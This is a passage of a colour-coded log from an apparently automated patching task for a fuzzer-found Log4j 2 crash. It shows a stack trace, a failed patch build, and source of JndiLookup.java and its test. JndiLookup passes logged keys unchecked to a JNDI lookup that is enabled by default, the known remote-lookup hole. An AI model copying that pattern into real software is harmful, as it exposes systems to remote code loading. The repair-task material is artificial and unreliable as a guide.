[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.callAppenders[0m[1;39m([0m[39mLoggerConfig.jav[0m[1;92ma:4[0m [2m                [0m
[2;36m                    [0m         [1;92m26[0m[1;39m)[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1;39m([0m[39mLoggerConfig.jav[0m[1;92ma:407[0m[1;39m)[0m        [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1;39m([0m[39mLoggerConfig.jav[0m[1;92ma:368[0m[1;39m)[0m        [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m[1;35morg.apache.logging.log4j.core.Logger.log[0m[1;39m([0m[39mLogger.jav[0m[1;92ma:110[0m[1;39m)[0m                [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.spi.AbstractLogger.warn[0m[1;39m([0m[39mAbstractLogger.jav[0m[1;92ma:1916[0m[1;39m)[0m          [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35mcom.example.SimpleLoggerFuzzer.fuzzerTestOneInput[0m[1;39m([0m[39mSimpleLoggerFuzzer.jav[0m[1;92ma:42[0m[1;39m)[0m       [2m                [0m
[2;36m                    [0m         [39mDEDUP_TOKEN: 03a39a742f79fa3d[0m                                                       [2m                [0m
[2;36m                    [0m         [39m== libFuzzer crashing input ==[0m                                                      [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95missue[0m[39m>[0m                                                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Additional Issue Log[0m                                                             [2m                [0m
[2;36m                    [0m         [39mHere is the additional issue log after the last patch attempt:[0m                      [2m                [0m
[2;36m                    [0m         [39m<additional_issue>[0m                                                                  [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m COMPILATION ERROR : [0m                                                        [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m -------------------------------------------------------------[0m                [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m [0m                                                                            [2m                [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/lookup/[0m[95mJndiLoo[0m [2m                [0m
[2;36m                    [0m         [95mkup.java[0m[39m:[0m[1;39m[[0m[1;36m134[0m[39m,[0m[1;36m9[0m[1;39m][0m[39m cannot assign a value to final variable ENABLE_JNDI[0m                [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m[1;36m1[0m[39m error[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m -------------------------------------------------------------[0m                [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m ------------------------------------------------------------------------[0m     [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Reactor Summary for Apache Log4j [0m[1;36m2[0m[39m [0m[1;36m2.0[0m[39m-beta9-SNAPSHOT:[0m                       [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                             [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Apache Log4j [0m[1;36m2[0m[39m [0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[39m. SUCCESS [0m[1;39m[[0m[39m  [0m[1;36m7.456[0m[39m s[0m[1;39m][0m     [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Apache Log4j API [0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[39m.. SUCCESS [0m[1;39m[[0m[39m  [0m[1;36m8.891[0m[39m s[0m[1;39m][0m     [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Apache Log4j Core [0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[39m. FAILURE [0m[1;39m[[0m[39m  [0m[1;36m5.073[0m[39m s[0m[1;39m][0m     [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m ------------------------------------------------------------------------[0m     [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m BUILD FAILURE[0m                                                                [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m ------------------------------------------------------------------------[0m     [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Total time:  [0m[1;36m27.634[0m[39m s[0m                                                        [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Finished at: [0m[1;36m2026[0m[39m-[0m[1;36m01[0m[39m-06T[0m[1;92m17:14:56[0m[39mZ[0m                                            [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m ------------------------------------------------------------------------[0m     [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m Failed to execute goal [0m                                                     [2m                [0m
[2;36m                    [0m         [39morg.apache.maven.plugins:maven-compiler-plugin:[0m[1;36m3.1[0m[39m:compile [0m[1;39m([0m[39mdefault-compile[0m[1;39m)[0m[39m on [0m    [2m                [0m
[2;36m                    [0m         [39mproject log4j-core: Compilation failure[0m                                             [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m [0m                                                                            [2m                [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/lookup/[0m[95mJndiLoo[0m [2m                [0m
[2;36m                    [0m         [95mkup.java[0m[39m:[0m[1;39m[[0m[1;36m134[0m[39m,[0m[1;36m9[0m[1;39m][0m[39m cannot assign a value to final variable ENABLE_JNDI[0m                [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m [0m                                                                            [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m -> [0m[1;39m[[0m[39mHelp [0m[1;36m1[0m[1;39m][0m                                                                 [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m [0m                                                                            [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m To see the full stack trace of the errors, re-run Maven with the -e switch.[0m [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m Re-run Maven using the -X switch to enable full debug logging.[0m              [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m [0m                                                                            [2m                [0m
[2;36m                    [0m         [1;39m[[0m[39mERROR[0m[1;39m][0m[39m For more information about the errors[0m                                       [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95madditional_issue[0m[39m>[0m                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Notes[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m- All patch attempts are applied to the initial codebase. Reapply the the previous [0m [2m                [0m
[2;36m                    [0m         [39mpatches if needed.[0m                                                                  [2m                [0m
[2;36m                    [0m         [39m- If multiple different issues are present, all the issues must be resolved in a [0m   [2m                [0m
[2;36m                    [0m         [39msingle patch attempt.[0m                                                               [2m                [0m
[2;36m                    [0m         [39m- Try different approaches to resolve the issues.[0m                                   [2m                [0m
[2;36m                    [0m         [39m===Analysis [0m[33mReport[0m[39m===[0m                                                               [2m                [0m
[2;36m                    [0m         [39m# Analysis Report[0m                                                                   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Relevant Code Snippets[0m                                                           [2m                [0m
[2;36m                    [0m         [39m<code_snippets>[0m                                                                     [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:1[0m[39m-[0m[1;36m88[0m        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.lookup;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import javax.naming.InitialContext;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import javax.naming.NamingException;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m: * Looks up keys from JNDI resources.[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"jndi"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:public class JndiLookup implements StrLookup [0m[1;39m{[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:    private static boolean ENABLE_JNDI = true;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    [0m[35m/[0m[39m** JNDI resourcce path prefix used in a J2EE container *[0m[35m/[0m                   [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = [0m[32m"java:comp/env/"[0m[39m;[0m  [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:     * Get the value of the JNDI resource.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * @param key  the JNDI resource name to be looked up, may be null[0m           [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * @return The value of the JNDI resource.[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        return [0m[1;35mlookup[0m[1;39m([0m[39mnull, key[0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * Get the value of the JNDI resource.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     * @param event The current LogEvent [0m[1;39m([0m[39mis ignored by this StrLookup[0m[1;39m)[0m[39m.[0m         [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * @param key  the JNDI resource name to be looked up, may be null[0m           [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     * @return The value of the JNDI resource.[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        if [0m[1;39m([0m[39mkey == null || ! ENABLE_JNDI[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:            InitialContext ctx = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:            return [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mctx.lookup[0m[1;39m([0m[1;35mconvertJndiName[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mNamingException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:     * Convert the given JNDI name to the actual JNDI name to use.[0m               [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:     * Default implementation applies the [0m[32m"java:comp/env/"[0m[39m prefix[0m                [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:     * unless other scheme like [0m[32m"java:"[0m[39m is given.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:     * @param jndiName The name of the resource.[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:     * @return The fully qualified name to look up.[0m                              [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:    private String [0m[1;35mconvertJndiName[0m[1;39m([0m[39mString jndiName[0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:        if [0m[1;39m([0m[39m![0m[1;35mjndiName.startsWith[0m[1;39m([0m[39mCONTAINER_JNDI_RESOURCE_PATH_PREFIX[0m[1;39m)[0m[39m && [0m        [2m                [0m
[2;36m                    [0m         [1;35mjndiName.indexOf[0m[1;39m([0m[32m':'[0m[1;39m)[0m[39m == [0m[1;36m-1[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;[0m           [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:        return jndiName;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:    public static void [0m[1;35msetEnableJndi[0m[1;39m([0m[39mboolean enableJndi[0m[1;39m)[0m[39m [0m[1;39m{[0m                       [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:        ENABLE_JNDI = enableJndi;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:    public static boolean [0m[1;35misEnableJndi[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:        return ENABLE_JNDI;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/test/java/org/apache/logging/log4j/core/lookup/JndiLookupTest.jav[0m[1;92ma:19[0m[39m-[0m[1;36m67[0m   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import static org.junit.Assert.assertEquals;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import static org.junit.Assert.assertNull;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import javax.naming.Context;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import javax.naming.InitialContext;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import javax.naming.NamingException;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:import org.junit.After;[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:import org.junit.Before;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:import org.junit.Test;[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:import org.mockejb.jndi.MockContextFactory;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m: * JndiLookupTest[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:public class JndiLookupTest [0m[1;39m{[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    private static final String TEST_CONTEXT_RESOURCE_NAME = [0m                    [2m                [0m
[2;36m                    [0m         [32m"logging/context-name"[0m[39m;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:    private static final String TEST_CONTEXT_NAME = [0m[32m"app-1"[0m[39m;[0m                     [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:    @Before[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    public void [0m[1;35mbefore[0m[1;39m([0m[1;39m)[0m[39m throws NamingException [0m[1;39m{[0m                                [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:        [0m[1;35mMockContextFactory.setAsInitial[0m[1;39m([0m[1;39m)[0m[39m;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:        Context context = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        [0m[1;35mcontext.bind[0m[1;39m([0m[39mJndiLookup.CONTAINER_JNDI_RESOURCE_PATH_PREFIX + [0m           [2m                [0m
[2;36m                    [0m         [39mTEST_CONTEXT_RESOURCE_NAME, TEST_CONTEXT_NAME[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    @After[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:    public void [0m[1;35mafter[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:        [0m[1;35mMockContextFactory.revertSetAsInitial[0m[1;39m([0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:    @Test[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    public void [0m[1;35mtestLookup[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:        if [0m[1;39m([0m[39m! [0m[1;35mJndiLookup.isEnableJndi[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:            return;[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        final StrLookup lookup = new [0m[1;35mJndiLookup[0m[1;39m([0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        String contextName = [0m[1;35mlookup.lookup[0m[1;39m([0m[39mTEST_CONTEXT_RESOURCE_NAME[0m[1;39m)[0m[39m;[0m          [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTEST_CONTEXT_NAME, contextName[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        contextName = [0m                                                           [2m                [0m
[2;36m                    [0m         [1;35mlookup.lookup[0m[1;39m([0m[39mJndiLookup.CONTAINER_JNDI_RESOURCE_PATH_PREFIX + [0m                     [2m                [0m
[2;36m                    [0m         [39mTEST_CONTEXT_RESOURCE_NAME[0m[1;39m)[0m[39m;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTEST_CONTEXT_NAME, contextName[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:        String nonExistingResource = [0m                                            [2m                [0m
[2;36m                    [0m         [1;35mlookup.lookup[0m[1;39m([0m[32m"logging/non-existing-resource"[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        [0m[1;35massertNull[0m[1;39m([0m[39mnonExistingResource[0m[1;39m)[0m[39m;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mapi/src/main/java/org/apache/logging/log4j/util/PropertiesUtil.jav[0m[1;92ma:19[0m[39m-[0m[1;36m23[0m           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.io.IOException;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import java.io.InputStream;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import java.util.Properties;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.status.StatusLogger;[0m                             [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mapi/src/main/java/org/apache/logging/log4j/util/PropertiesUtil.jav[0m[1;92ma:28[0m[39m-[0m[1;36m70[0m           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:public class PropertiesUtil [0m[1;39m{[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:    private static final PropertiesUtil LOG4J_PROPERTIES = new [0m                  [2m                [0m
[2;36m                    [0m         [1;35mPropertiesUtil[0m[1;39m([0m[32m"log4j2.component.properties"[0m[1;39m)[0m[39m;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:    private final Properties props;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    public [0m[1;35mPropertiesUtil[0m[1;39m([0m[39mfinal Properties props[0m[1;39m)[0m[39m [0m[1;39m{[0m                              [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:        this.props = props;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:    public [0m[1;35mPropertiesUtil[0m[1;39m([0m[39mfinal String propsLocn[0m[1;39m)[0m[39m [0m[1;39m{[0m                              [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:        this.props = new [0m[1;35mProperties[0m[1;39m([0m[1;39m)[0m[39m;[0m                                           [2m                [0m
